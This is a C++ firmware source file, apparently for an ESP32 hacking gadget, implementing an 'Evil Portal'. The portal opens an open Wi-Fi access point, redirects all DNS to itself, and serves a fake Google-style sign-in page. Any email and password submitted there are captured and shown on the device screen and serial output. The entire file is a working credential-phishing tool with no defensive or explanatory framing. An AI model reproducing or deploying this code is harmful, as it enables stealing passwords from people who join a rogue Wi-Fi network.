#include "EvilPortal.h"

WiFiClass EvilPortal::WiFi;
DNSServer EvilPortal::dnsServer;
WebServer EvilPortal::webServer(80);
IPAddress EvilPortal::apGateway(192, 168, 1, 1);
String EvilPortal::SSID = "Atomic Portal";
String EvilPortal::htmlPage = "";

void EvilPortal::Start() {
    print::ClearScreen();
    std::vector<std::pair<std::string, std::function<void()>>> options = {
        {"Use Template", [=]
        {
            defaultHTML();
            setupAccessPoint();
            setupCaptivePortal();
        }},
        {"Use Custom", [=]
        {
            files::ls("/", [&](const String& content) {
                htmlPage = content;
            });

            defaultHTML();
            setupAccessPoint();
            setupCaptivePortal();
        }},
    };
    print::LoopOptions(options, "Portal", 0);
}

void EvilPortal::setupAccessPoint() {
    WiFiClass::mode(WIFI_MODE_AP);
    WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
    WiFi.softAP(SSID);
}

[[noreturn]] void EvilPortal::setupCaptivePortal() {
    webServer.on("/", [] { webServer.send(200, "text/html", htmlPage); });
    webServer.on("/post", handleLogin);
    webServer.onNotFound([] { webServer.send(200, "text/html", htmlPage); });
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.begin();

    print::ClearScreen();
    print::WriteLine("Evil Portal", "Started", true);
    print::CenteredPrint(Messages::bButton().c_str(), 1);

    while (true) {
        dnsServer.processNextRequest();
        webServer.handleClient();

        if (buttons::isBtnBPressed())
        {
            ESP.restart();
        }
    }
}

void EvilPortal::defaultHTML() {
 htmlPage = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sign in</title>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                align-items: center;
                justify-content: center;
                background-color: #FFFFFF;
                margin: 0;
                padding: 0;
                height: 100vh;
            }
            .container {
                max-width: 400px;
                padding: 20px;
                border: 1px solid #ccc;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            }
            .container h1 {
                text-align: center;
                margin-bottom: 20px;
            }
            .input-field {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            .submit-btn {
                width: 100%;
                padding: 10px;
                background-color: #4285f4;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
            .submit-btn:hover {
                background-color: #357ae8;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Sign in</h1>
            <form action="/post" method="post">
                <input type="text" name="email" class="input-field" placeholder="Email or phone" required>
                <input type="password" name="password" class="input-field" placeholder="Password" required>
                <input type="text" name="optionalField" class="input-field" placeholder="Optional Field">
                <button type="submit" class="submit-btn">Next</button>
            </form>
        </div>
    </body>
    </html>
    )rawliteral";
}

void EvilPortal::handleLogin() {
    if (webServer.args() > 0) {
        processCredentials();
    }
    webServer.send(200, "text/html", "<h1>Credentials received</h1>");
}

void EvilPortal::processCredentials() {
    std::map<std::string, std::string> credentials;

    for (int i = 0; i < webServer.args(); ++i) {
        credentials[webServer.argName(i).c_str()] = webServer.arg(i).c_str();
    }

    for (const auto &pair : credentials) {
        Serial.printf("Field: %s, Value: %s\n", pair.first.c_str(), pair.second.c_str());
        print::WriteLine(pair.first.c_str(), pair.second.c_str(), true);
    }
}
